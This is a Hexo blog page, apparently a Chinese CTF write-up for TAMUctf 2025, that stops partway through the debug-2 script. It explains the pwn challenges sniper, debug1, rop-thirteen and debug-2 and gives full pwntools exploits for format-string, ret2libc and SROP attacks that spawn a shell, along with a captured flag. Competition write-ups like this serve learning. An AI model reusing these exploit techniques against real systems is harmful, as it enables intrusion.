@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="AK题目6&#x2F;8，最有意思的一集，体验很好（出题人发源码suki），最后两个题看不懂要干什么摆了没做  sniper挺好玩的格式化字符串漏洞。很有意思的一点是读入地址为0x0a0a0000, 两个回车符显然是防止我们直接往栈里输入地址。考查点是格式化字符串对于%s和%$ns处理先后顺序不同（前先后后），先用%c填充至栈地址再用%hn构造出0x0a0a构造出读入地址，再利用%10$s的处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025tamuctf">
+<meta property="og:url" content="http://example.com/2025/03/31/2025tamuctf/index.html">
+<meta property="og:site_name" content="Blog de Назриндак">
+<meta property="og:description" content="AK题目6&#x2F;8，最有意思的一集，体验很好（出题人发源码suki），最后两个题看不懂要干什么摆了没做  sniper挺好玩的格式化字符串漏洞。很有意思的一点是读入地址为0x0a0a0000, 两个回车符显然是防止我们直接往栈里输入地址。考查点是格式化字符串对于%s和%$ns处理先后顺序不同（前先后后），先用%c填充至栈地址再用%hn构造出0x0a0a构造出读入地址，再利用%10$s的处理">
+<meta property="og:locale">
+<meta property="article:published_time" content="2025-03-31T15:46:35.000Z">
+<meta property="article:modified_time" content="2025-04-09T16:35:31.141Z">
+<meta property="article:author" content="NazrinDuck">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2025/03/31/2025tamuctf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>2025tamuctf | Blog de Назриндак</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Blog de Назриндак</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">上不去下不来，卡在这了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/31/2025tamuctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="NazrinDuck">
+      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog de Назриндак">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2025tamuctf
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-03-31 23:46:35" itemprop="dateCreated datePublished" datetime="2025-03-31T23:46:35+08:00">2025-03-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-04-10 00:35:31" itemprop="dateModified" datetime="2025-04-10T00:35:31+08:00">2025-04-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>AK题目6&#x2F;8，最有意思的一集，体验很好（出题人发源码suki），最后两个题看不懂要干什么<del>摆了</del>没做</p>
+</blockquote>
+<h1 id="sniper"><a href="#sniper" class="headerlink" title="sniper"></a>sniper</h1><p>挺好玩的格式化字符串漏洞。很有意思的一点是读入地址为<code>0x0a0a0000</code>, 两个回车符显然是防止我们直接往栈里输入地址。<br>考查点是格式化字符串对于<code>%s</code>和<code>%$ns</code>处理先后顺序不同（前先后后），先用<code>%c</code>填充至栈地址再用<code>%hn</code>构造出<code>0x0a0a</code>构造出读入地址，再利用<code>%10$s</code>的处理顺序不同读出flag内容。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./sniper/sniper&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_sniper&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line">ls(stack_addr)</span><br><span class="line">addr = <span class="number">0x000000000A0A0000</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">payload = <span class="string">b&quot;%c%c%c%c%c%c%c%c%c%2561c%hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%10$s&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(stack_addr + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload = b&quot;%10$ln%2570c%11$hn&quot;</span></span><br><span class="line"><span class="string">payload += b&quot;%6$p&quot;</span></span><br><span class="line"><span class="string">payload = payload.ljust(32, b&quot;a&quot;)</span></span><br><span class="line"><span class="string">payload += p64(stack_addr)</span></span><br><span class="line"><span class="string">payload += p64(stack_addr + 2)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gigem&#123;you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/&#125;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="debug1"><a href="#debug1" class="headerlink" title="debug1"></a>debug1</h1><p>程序的debug功能直接暴露了system地址，且还包含一个很长的栈溢出。<br>利用程序正常流程中的溢出将程序流导向debug函数，之后就出来了。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./debug-1/debug-1&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./debug-1/libc.so.6&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_debug-1&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span> + p64(<span class="number">0x40139F</span> + <span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;well :) )\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;libc leak: &quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000023a5f: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002235f: ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">libc_base = system - libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023A5F</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002235F</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x68</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; characters)!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="rop-thirteen"><a href="#rop-thirteen" class="headerlink" title="rop-thirteen"></a>rop-thirteen</h1><blockquote>
+<p>对着源码分析即可，我都没用ida</p>
+</blockquote>
+<p>go pwn，然而漏洞很明显，一个貌似无限（实测是有限）的unsafe read函数：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">// Using same memory location for feedback to save memory</span></span><br><span class="line">    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&amp;rot13))</span><br><span class="line">    feedbackPointer := <span class="type">uintptr</span>(unsafe.Pointer(&amp;(feedback[<span class="number">0</span>])))</span><br><span class="line">    sliceHeader.Data = feedbackPointer</span><br><span class="line">    _, _ = reader.Read(rot13)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>首先随便填一些数据找到栈地址偏移(0x110)，再考虑构造ROP链。<br>题目静态链接，正好给我们提供了很多gadget<br>构造syscall ret链，先栈迁移到bss段，通过syscall read扩大溢出空间，再SROP一步到位拿shell。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./rop-thirteen/rop-thirteen&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_rop-thirteen&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;abcdefg&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;(up to 360 characters):&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000045f409: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000045e9f7: mov qword ptr [rdi], rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000465c64: xchg edi, eax; ret;</span></span><br><span class="line"><span class="string">0x000000000045dde7: xchg rdx, rax; ret;</span></span><br><span class="line"><span class="string">0x000000000045f34d: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000045f81d: mov rsp, rbp; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000041cf18: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000402481: xor rax, rax; ret;</span></span><br><span class="line"><span class="string">0x00000000004801bd: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x0000000000438d50: pop rsp; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x51C010</span></span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0x000000000045F409</span></span><br><span class="line">pop_rax = <span class="number">0x000000000040CC26</span></span><br><span class="line">xchg_edi_eax_ret = <span class="number">0x0000000000465C64</span></span><br><span class="line">mov_qword_rdi_rax = <span class="number">0x000000000045E9F7</span></span><br><span class="line">syscall_ret = <span class="number">0x000000000045F409</span></span><br><span class="line">pop_rdx = <span class="number">0x00000000004801BD</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000041CF18</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000045F34D</span></span><br><span class="line">leave_ret = <span class="number">0x000000000045F81D</span></span><br><span class="line">xor_rax = <span class="number">0x0000000000402481</span></span><br><span class="line">pop_rsp = <span class="number">0x0000000000438D50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 68732f6e69622f0a</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">59</span></span><br><span class="line">sigframe.rdi = addr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;k&quot;</span> * <span class="number">0x110</span>  <span class="comment"># + b&quot;b&quot; * 0x8</span></span><br><span class="line">payload += p64(xor_rax)</span><br><span class="line">payload += p64(xchg_edi_eax_ret)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x500</span>)</span><br><span class="line">payload += p64(xor_rax)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(pop_rsp)</span><br><span class="line">payload += p64(addr + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += bytes(sigframe)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;feedback here:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">15</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># b *0x484DFB</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="debug-2"><a href="#debug-2" class="headerlink" title="debug-2"></a>debug-2</h1><p>就是debug-1把debug函数删掉了，只有一个正常流程中的0x10 bytes的栈溢出<br>0x10 bytes栈溢出有公式打法，先栈迁移到bss段再打ret2libc<br>注意这个题有个大小写转换很烦人，payload需要经过处理再发出去</p>
+<blockquote>
+<p>不知道为什么远程bss段比本地bss段少了两页的空间，导致在printf的时候一直爆栈，迫不得已用了一次csu跳板跳过printf环节</p>
+</blockquote>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./debug-2/debug-2&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./debug-2/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span 